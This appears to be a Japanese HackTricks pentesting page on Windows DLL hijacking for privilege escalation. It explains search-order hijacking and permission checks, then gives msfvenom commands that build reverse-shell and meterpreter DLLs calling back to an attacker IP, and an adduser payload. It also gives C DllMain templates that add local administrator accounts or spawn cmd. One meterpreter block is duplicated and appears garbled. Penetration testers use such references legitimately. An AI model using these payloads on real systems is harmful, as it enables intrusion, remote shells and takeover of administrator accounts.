# Dllハイジャッキング

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味がある方、そして**解読不可能なものをハック**したい方 - **採用中です！**（流暢なポーランド語の読み書きが必要です）。

{% embed url="https://www.stmcyber.com/careers" %}

## 定義

まず、定義を確認しましょう。DLLハイジャッキングは、最も広義には、**正規/信頼されたアプリケーションを誤って/トリックして任意のDLLを読み込ませる**ことです。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語は、しばしば間違って同じ意味で使用されます。

Dllハイジャッキングは、**コードの実行**、**永続性の確保**、**特権のエスカレーション**に使用できます。この3つのうち、**特権のエスカレーション**は非常に見つけにくいです。ただし、これは特権エスカレーションセクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャッキングは同じ方法で実行されます。

### タイプ

アプリケーションが必要なDLLをロードする方法に応じて、さまざまなアプローチがあります。成功は、アプリケーションがDLLをロードする方法によって異なります。可能なアプローチには次のものがあります。

1. **DLLの置き換え**: 正規のDLLを悪意のあるDLLで置き換えます。これは、元のDLLのすべての機能が維持されるようにするために、_DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)]と組み合わせることができます。
2. **DLL検索順序のハイジャック**: パスのないアプリケーションが指定したDLLは、特定の順序で固定された場所で検索されます \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]。ハイジャックは、悪意のあるDLLを実際のDLLよりも先に検索される場所に配置することで行われます。これには、対象アプリケーションの作業ディレクトリも含まれる場合があります。
3. **Phantom DLLハイジャック**: 正規のアプリケーションが読み込もうとする欠落/存在しないDLLの代わりに悪意のあるDLLを配置します \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)]。
4. **DLLリダイレクト**: DLLの検索場所を変更します。たとえば、`%PATH%`環境変数を編集するか、`.exe.manifest` / `.exe.local`ファイルを編集して、悪意のあるDLLを含むフォルダを追加します \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)]。
5. **WinSxS DLLの置き換え**: 対象のDLLの関連するWinSxSフォルダに正規のDLLを悪意のあるDLLで置き換えます。DLLサイドローディングとも呼ばれることがよくあります \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]。
6. **相対パスDLLハイジャック**: 正規のアプリケーションをユーザーが書き込み可能なフォルダにコピー（オプションで名前を変更）し、悪意のあるDLLと一緒に配置します。使用方法によっては、（署名済みの）バイナリプロキシ実行 \[[8](https://attack.mitre.org/techniques/T1218/)]と類似点があります。これのバリエーションは、（ややオキシモロン的に）「_bring your own LOLbin_」 \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]と呼ばれ、正規のアプリケーションが悪意のあるDLLと一緒に持ち込まれます（被害者のマシンの正規の場所からコピーされるのではなく）。

## 欠落しているDllを見つける

システム内の欠落しているDllを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)をsysinternalsから実行し、次の2つのフィルタを**設定**することです。

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムのアクティビティ**を表示します。

![](<../../.gitbook/assets/image (314).png>)

**一般的な欠落しているdllを探している**場合は、これを数秒間実行しておきます。\
**特定の実行可能ファイル内の欠落しているdllを探している**場合は、**「プロセス名」が「\<exec name>」を含む**ような別のフィルタを設定し、実行してイベントのキャプチャを停止します。
## ミッシングDLLの悪用

特権をエスカレーションするために、私たちが最も良いチャンスを持っているのは、特権プロセスが**検索される場所**で**ロードしようとするdllを書く**ことができることです。したがって、**オリジナルのdll**よりも前に検索される**フォルダ**にdllを**書き込む**ことができます（奇妙なケース）、またはdllがどのフォルダにも存在しない**フォルダ**に**書き込む**ことができます。

### DLLの検索順序

一般的に、**Windowsアプリケーション**は、DLLを見つけるために**事前に定義された検索パス**を使用し、特定の順序でこれらのパスをチェックします。 DLLハイジャックは通常、悪意のあるDLLをこれらのフォルダの1つに配置し、そのDLLが正当なDLLよりも先に見つかるようにします。この問題は、アプリケーションが必要なDLLに絶対パスを指定することで緩和することができます。

以下は、32ビットシステムでのDLLの検索順序です。

1. アプリケーションがロードされたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。ただし、これには**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLLの検索パスを計算する際には使用されません。

これが**デフォルト**の検索順序で、**SafeDllSearchMode**が有効になっています。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出される場合、検索は**LoadLibraryEx**がロードしている実行可能モジュールのディレクトリから開始されます。

最後に、**dllは名前だけでなく絶対パスを指定してロードすることもできます**。その場合、そのdllはそのパスでのみ検索されます（dllに依存関係がある場合、名前でロードされたときと同様に検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

#### Windowsドキュメントからのdll検索順序の例外

* **同じモジュール名のDLLがすでにメモリにロードされている**場合、システムはロードされたDLLにリダイレクトとマニフェストをチェックし、DLLを検索しません。
* DLLが実行中のアプリケーションのWindowsバージョンの**既知のDLLリスト**にある場合、**システムは既知のDLLのコピー**（および既知のDLLの依存するDLL、ある場合）を検索する代わりに使用します。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
* DLLに依存関係がある場合、システムは最初のDLLがフルパスを指定してロードされた場合でも、依存するDLLを**モジュール名だけでロードされたかのように検索**します。

### 特権のエスカレーション

**前提条件**：

* 特権のあるプロセスを見つける（水平/横方向の移動）ことができる**別の特権で実行されるプロセス**を見つける。
* dllが**存在しない**フォルダ（おそらく実行可能ファイルのディレクトリまたはシステムパス内のフォルダ）に、dllが**検索される**任意の**フォルダ**に**書き込み権限**を持つ。

はい、前提条件は複雑で、**デフォルトでは特権のある実行可能ファイルがdllが存在しない**というのは奇妙であり、**システムパスのフォルダに書き込み権限を持つ**のはさらに**奇妙です**（デフォルトではできません）。しかし、設定が誤っている環境では、これが可能です。\
もし要件を満たす幸運がある場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。このプロジェクトの**主な目標はUACのバイパス**ですが、おそらく書き込み権限を持つフォルダのパスを変更するだけで使用できるWindowsバージョンのDllハイジャックのPoCを見つけることができます。

フォルダの**アクセス権限を確認する**には、次のコマンドを実行します：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダのアクセス許可を確認**してください：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドを使用して、実行可能ファイルのインポートとDLLのエクスポートを確認することもできます。

```bash
dumpbin /imports <executable>
dumpbin /exports <dll>
```

これにより、実行可能ファイルが依存しているDLLと、DLLが公開している関数が表示されます。
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
完全なガイドは、**権限をエスカレートするためにDllハイジャッキングを悪用**する方法について、**システムパスフォルダ**に書き込み権限があるかどうかを確認するために、次を参照してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムパス内の任意のフォルダに書き込み権限があるかどうかを確認します。\
この脆弱性を発見するための他の興味深い自動化ツールは、**PowerSploitの関数**であり、_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_です。

### 例

攻撃可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの一つは、**実行可能ファイルがインポートするすべての関数を少なくともエクスポートするdllを作成する**ことです。ただし、Dllハイジャッキングは、[中間完全性レベルから高いレベルにエスカレートするために（UACをバイパスするために）](../authentication-credentials-uac-and-efs.md#uac)または[高い完全性からSYSTEMにエスカレートするために](./#from-high-integrity-to-system)**便利です。** Windowsでdllハイジャッキングを実行するためのこのdllハイジャッキングの研究には、有効なdllを作成する方法の例があります：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**では、**テンプレート**として役立つ可能性のあるいくつかの**基本的なdllコード**を見つけることができます。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に、**Dllプロキシ**は、**ロードされたときに悪意のあるコードを実行**することができるDllであり、また、**実際のライブラリにすべての呼び出しを中継**することで、**期待どおりに公開**および**動作**することができます。

ツール\*\*\*\*[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)\*\*\*\*または\*\*\*\*[**Spartacus**](https://github.com/Accenture/Spartacus)\*\*\*\*を使用すると、実際のライブラリを指定して実行可能ファイルを選択し、プロキシ化されたdllを生成するか、Dllを指定してプロキシ化されたdllを生成することができます。

### **Meterpreter**

**Revシェルを取得（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリターの取得（x86）：**

```plaintext
1. Metasploitフレームワークを使用して、ターゲットマシンにメータープリターをデプロイします。

2. Metasploitコンソールを開き、以下のコマンドを実行します。

   ```shell
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <attacker IP>
   set LPORT <attacker port>
   exploit
   ```

   `<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポートに置き換えてください。

3. メータープリターが正常にデプロイされると、攻撃者はターゲットマシンに対して様々な特権昇格攻撃を実行することができます。
```
```plaintext
1. Metasploitフレームワークを使用して、ターゲットマシンにメータープリターをデプロイします。

2. Metasploitコンソールを開き、以下のコマンドを実行します。

   ```shell
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <attacker IP>
   set LPORT <attacker port>
   exploit
   ```

   `<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポートに置き換えてください。

3. メータープリターが正常にデプロイされると、攻撃者はターゲットマシンに対して様々な特権昇格攻撃を実行することができます。
```
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーの作成（x86版、x64版は見当たりませんでした）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身の

注意してください。いくつかの場合、コンパイルしたDllは、被害者プロセスによってロードされる複数の関数を**エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはロードできず**、**攻撃は失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

もしあなたが**ハッキングのキャリア**に興味があり、**解読不能なものをハック**したいのであれば - **私たちは採用しています！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
